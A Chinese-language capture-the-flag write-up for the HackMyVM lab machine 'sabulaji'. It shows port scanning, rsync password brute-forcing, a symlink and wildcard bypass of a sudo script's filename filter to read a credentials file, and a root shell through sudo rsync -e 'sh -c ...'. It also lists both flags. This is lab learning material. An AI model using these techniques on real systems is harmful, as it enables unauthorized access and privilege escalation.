---
title: hackmyvm-sabulaji
date: 2025-10-18
categories: [靶机]
tags: [hmv,medium]     # TAG names should always be lowercase
---



### 1.主机发现

```
┌──(root㉿PH)-[~]
└─# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:84:cf:10, IPv4: 192.168.56.88
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.1    0a:00:27:00:00:1b       (Unknown: locally administered)
192.168.56.100  08:00:27:ae:c7:a1       PCS Systemtechnik GmbH
192.168.56.105  08:00:27:18:82:eb       PCS Systemtechnik GmbH

6 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.022 seconds (126.61 hosts/sec). 3 responded
```

靶机地址是192.168.56.105

### 2.端口扫描

```
┌──(root㉿PH)-[~]
└─# nmap -Pn $ip -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-18 11:30 CST
Nmap scan report for gogs.dsz (192.168.56.105)
Host is up (0.00057s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
873/tcp open  rsync
MAC Address: 08:00:27:18:82:EB (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 4.76 seconds
```

开放了22，80，873，先去web瞅一眼

### 3. web

web啥也没有，目录扫描也没有发现

### 4. rsync 服务

+ `rsync` 是一种高效的文件同步工具，它可以在本地或远程系统之间同步文件和目录，其主要特点是使用“增量传输”算法，即只传输两份文件之间的差异部分，从而显著提高传输速度和节省带宽。 `rsync` 支持多种传输方式，包括通过SSH 进行安全传输，并且可以通过命令进行配置，常用于备份和同步任务。

+ 看看rsync服务

 ```
  ┌──(root㉿PH)-[~]
  └─# rsync rsync://$ip
  
  public          Public Files
  epages          Secret Documents
 ```

  有两个共享目录，但是只能匿名看public，epages需要密码。

+ 先看看public


  ```
  ┌──(root㉿PH)-[~/son]
  └─# rsync rsync://$ip/public
  
  drwxr-xr-x          4,096 2025/05/16 00:35:39 .
  -rw-r--r--            433 2025/05/16 00:35:39 todo.list
  
  ┌──(root㉿PH)-[~/son]
  └─# rsync rsync://$ip/public/todo.list .
  
  
  ┌──(root㉿PH)-[~/son]
  └─# cat todo.list
  To-Do List
  =========
  
  1. sabulaji: Remove private sharing settings
     - Review all shared files and folders.
     - Disable any private sharing links or permissions.
  
  2. sabulaji: Change to a strong password
     - Create a new password (minimum 12 characters, include uppercase, lowercase, numbers, and symbols).
     - Update the password in the system settings.
     - Ensure the new password is not reused from other accounts.
  =========
  ```

  有一个用户sabulaji，然后写了一个创建最小密码长度大于12，这里有点迷糊，不知道是不是rsync服务的密码要大于12，也可能是弱密码。使用脚本跑一下密码

```
######################################################
                 Rsync-service Bruteforcer
                      Coded by ZyperX
######################################################

[+]Trying admin123...
[+] Password found:admin123

┌──(root㉿PH)-[~/exp/rsync_bruteforcer]
└─# bash rsync_brute.sh sabulaji $ip 873 /root/son/pass.txt epages
```

密码是admin123，登上去看看有什么文件

```
┌──(root㉿PH)-[~/son]
└─# rsync -av rsync://sabulaji@$ip/epages .

Password:
receiving incremental file list
./
secrets.doc

sent 46 bytes  received 13,435 bytes  5,392.40 bytes/sec
total size is 13,312  speedup is 0.99
```

拿到一个**secrets.doc**，拉到本地看看

![屏幕截图 2025-10-18 134313](/assets/img/3.png)

拿到凭证 `welcome:P@ssw0rd123!`

### 5.提权

+ ssh上去

  ```
  ┌──(root㉿PH)-[~]
  └─# ssh welcome@$ip
  welcome@192.168.56.105's password:
  Linux Sabulaji 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64
  
  The programs included with the Debian GNU/Linux system are free software;
  the exact distribution terms for each program are described in the
  individual files in /usr/share/doc/*/copyright.
  
  Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
  permitted by applicable law.
  Last login: Fri Oct 17 22:12:40 2025 from 192.168.56.88
  welcome@Sabulaji:~$ cd /home
  welcome@Sabulaji:/home$ ls
  sabulaji  welcome
  ```

  有两个用户，welcome可以直接读flag，sabulaji用户里面有一个**personal**目录我们没权限

  `sudo -l`发现可以执行`(sabulaji) NOPASSWD: /opt/sync.sh` ，看看这个文件

  ```
  welcome@Sabulaji:/home$ cat /opt/sync.sh
  #!/bin/bash
  
  if [ -z $1 ]; then
      echo "error: note missing"
      exit
  fi
  
  note=$1
  
  if [[ "$note" == *"sabulaji"* ]]; then
      echo "error: forbidden"
      exit
  fi
  
  difference=$(diff /home/sabulaji/personal/notes.txt $note)
  
  if [ -z "$difference" ]; then
      echo "no update"
      exit
  fi
  
  echo "Difference: $difference"
  
  cp $note /home/sabulaji/personal/notes.txt
  
  echo "[+] Updated."
  ```

  大概意思是传进去一个文件，但是文件名不能含有**sabulaji**，将他和**/home/sabulaji/personal/notes.txt**文件做比较，然后输出不同。我第一感觉是进行命令劫持，但是后来发现他设置了`secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin`，这样的话我们修改本地的PATH也没用。

  既然他不给我们比较含有**sabulaji**的文件，那我们就得读。这里卡了好久，因为读文件的话读啥，后面看wp有一个**creds.txt**

  ```
  welcome@Sabulaji:/home$ id
  uid=1000(welcome) gid=1000(welcome) groups=1000(welcome),123(mlocate)
  welcome@Sabulaji:/home$ find / -group mlocate  2>/dev/null
  /usr/bin/mlocate
  /etc/rsyncd.conf
  /etc/rsyncd.secrets
  /var/lib/mlocate/mlocate.db
  /var/cache/locate/locatedb
  /srv/rsync/public/todo.list
  ```

  我们在一个特殊的组里面，查看属于这个组的文件，发现有一个数据库文件，看看

  ```
  welcome@Sabulaji:/home$ strings /var/lib/mlocate/mlocate.db | grep -C 5 'sabulaji'
  xdg-user-dirs.desktop
  O2,)x
  /etc/xdg/systemd
  user
  /home
  sabulaji
  welcome
  /home/sabulaji
  .bash_history
  .bash_logout
  .bashrc
  .profile
  personal
  /home/sabulaji/personal
  creds.txt
  notes.txt
  /home/welcome
  .bash_history
  .bash_logout
  ```

  有一个**creds.txt**文件，看来应该就是读它了

+ 这里呢有两个方法，一个是软链接，一个是通配符

  1.**软链接**

  ```
  welcome@Sabulaji:~$ ln -sv /home/sabulaji/personal/creds.txt ./xxx
  './xxx' -> '/home/sabulaji/personal/creds.txt'
  welcome@Sabulaji:~$ sudo -u sabulaji /opt/sync.sh ./xxx
  Difference: 1c1
  < flag{user-cf7883184194add6adfa5f20b5061ac7}
  ---
  > Sensitive Credentials:Z2FzcGFyaW4=
  [+] Updated.
  ```

  2.**通配符** (因为源文件判断的是sabulaji，我们把其中一个字符换为*就可以了)

  ```
  welcome@Sabulaji:~$ sudo -u sabulaji /opt/sync.sh /home/sabu*aji/personal/creds.txt
  Difference: 1c1
  < flag{user-cf7883184194add6adfa5f20b5061ac7}
  ---
  > Sensitive Credentials:Z2FzcGFyaW4=
  [+] Updated.
  ```

  ok,密码就是**Z2FzcGFyaW4=**

+ 提权到另一个用户

  ```
  welcome@Sabulaji:~$ su - sabulaji
  Password:
  sabulaji@Sabulaji:~$ sudo -l
  Matching Defaults entries for sabulaji on Sabulaji:
      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
  
  User sabulaji may run the following commands on Sabulaji:
      (ALL) NOPASSWD: /usr/bin/rsync
  ```

+ 直接

  `sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null` 就到root了



### 6. flag展示

```
user.txt   flag{user-cf7883184194add6adfa5f20b5061ac7}
root.txt   flag{root-89e62d8807f7986edb259eb2237d011c}
```



